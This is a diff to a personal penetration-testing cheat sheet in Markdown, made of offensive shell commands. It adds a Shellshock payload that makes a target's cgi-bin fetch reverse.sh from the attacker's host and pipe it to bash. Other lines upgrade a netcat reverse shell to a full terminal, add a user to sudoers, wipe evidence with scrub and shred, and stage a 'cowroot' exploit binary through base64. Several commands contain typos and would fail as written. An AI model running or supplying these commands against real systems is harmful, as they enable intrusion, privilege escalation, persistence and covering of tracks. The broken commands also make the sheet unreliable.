@@ -122,25 +122,19 @@ Get users that login into the system
 last
 ```
 
-Launch a pseudo-control
-1. In the remote shell
+# CONSOLIDATE Remote SHELL with netcat 
 ```bash
 script /dev/null -c bash
 
 (and press Control + Z)
-```
 
-2. In your shell:
-```bash
 stty raw -echo
 
-nc -nlvp 443
-
-# <press fg>
+fg
 
 reset
 
-# Consolidate your terminal
+# Consolidate your terminal, if he ask:
 xterm
 
 # To be able to make Control + C and Control + L
@@ -148,7 +142,7 @@ export TERM=xterm
 export SHELL=bash
 
 # Get correct proporcion
-stty rows 52 columns 197
+stty rows 52 columns 187
 ```
 
 # Remove Evidences
@@ -232,3 +226,56 @@ steghide info <picture.jpg>
 echo "<user> ALL=(ALL:ALL) ALL" | sudo tee -a /etc/sudoers
 ```
 
+# Searching nmap scripts
+```bash
+locate .nse | xargs grep "categories" | grep -oP '".*?"' | sort -u
+```
+
+Mix two scripts in nmap
+```bash
+nmap script "vuln and safe"
+```
+
+# Script http-enum.nse of nmap it has a dictionary to apply a small fuzzing
+```
+nmap --scrtip "http-enum" -p80 <remote-ip> -oN <output_file>
+```
+
+# Working with tcpdump, make pcap
+```
+sudo tcpdump -i tun0 -w Capture.cap -v
+```
+
+#Working with tshark
+```
+tshark -r Capture.cap -Y "http" -Tfields e tcp.payload 2> /dev/null | xxd -p -r | grep "^GET" | awk'{print $2}' 
+```
+
+# Deleting evidences
+```
+scrub -p dod file.txt && shred -zun 5 -v file.txt
+```
+
+# Stenography
+```
+stephide info <image.png>
+```
+
+# Shellcode on cgi-bin
+```
+curl -H "User-Agent: () { :; };echo;echo; /usr/bin/curl http://<your-local-ip>/reverse.sh | /bin/bash" "http://<remote-affected-ip>/cgi-bin/test.cgi"; echo
+```
+
+# thark for icmp
+```
+tshark -i tun0 -Y "icmp" 2>/dev/null
+```
+
+# Convert to base64 a binary and copy to clipboard
+```
+base64 -w 0 cowroot  | xclip -sel clip
+```
+And in remote machine
+```
+echo "<the base 64 code >" | base64 -d > cowroot
+```
